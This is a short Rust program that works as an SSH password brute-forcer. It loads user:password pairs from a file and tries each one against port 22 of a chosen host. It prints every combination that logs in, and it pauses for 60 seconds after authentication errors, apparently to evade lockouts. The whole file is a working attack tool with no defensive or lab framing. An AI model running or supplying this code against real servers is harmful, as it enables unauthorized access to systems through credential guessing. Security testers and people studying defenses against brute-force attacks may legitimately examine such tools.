use clap::Parser;
use ssh2::Session;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::net::TcpStream;
use std::process;
use std::thread::sleep;
use std::time::Duration;

/****
File format:
user:password
****/

const PORT: u16 = 22;

fn is_ssh_open(host: &str, user: &str, passwd: &str) -> bool {
    let addr = format!("{}:{}", host, PORT);
    let tcp = match TcpStream::connect(addr) {
        Ok(tcp) => tcp,
        Err(_) => {
            eprintln!("host unreachable: {}", host);
            return false;
        }
    };

    let mut session = Session::new().unwrap();
    session.set_tcp_stream(tcp);
    session.handshake().unwrap();

    match session.userauth_password(user, passwd) {
        Ok(_) => {
            if session.authenticated() {
                println!(
                    "\n\tmatched: \n\tuser = {}\n\tpassword = {}\n",
                    user, passwd
                );
                return true;
            } else {
                println!("invalid: {}:{}", user, passwd);
                return false;
            }
        }
        Err(e) => {
            if e.code() == ssh2::ErrorCode::Session(-18) {
                println!("invalid: {}: {}", user, passwd);
                print!("sleeping for 60 seconds...");
                sleep(Duration::from_secs(60));
            } else {
                println!("error: {:?}", e);
            }
            return false;
        }
    }
}

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(long)]
    host: String,

    #[arg(short, long)]
    filename: String,
}

fn main() {
    let args = Args::parse();
    let host = args.host;
    let filename = args.filename;

    let f = match File::open(filename.clone()) {
        Ok(f) => f,
        Err(_) => {
            eprintln!("file not found: {}", filename.clone());
            process::exit(1);
        }
    };

    let reader = BufReader::new(f);

    let mut logins = vec![];

    for line in reader.lines() {
        let line = line.unwrap();
        let (user, password) = line.split_once(":").unwrap();
        logins.push((user.to_string(), password.to_string()));
    }

    for (user, password) in logins {
        is_ssh_open(&host, &user, &password);
    }

    println!("done");
}
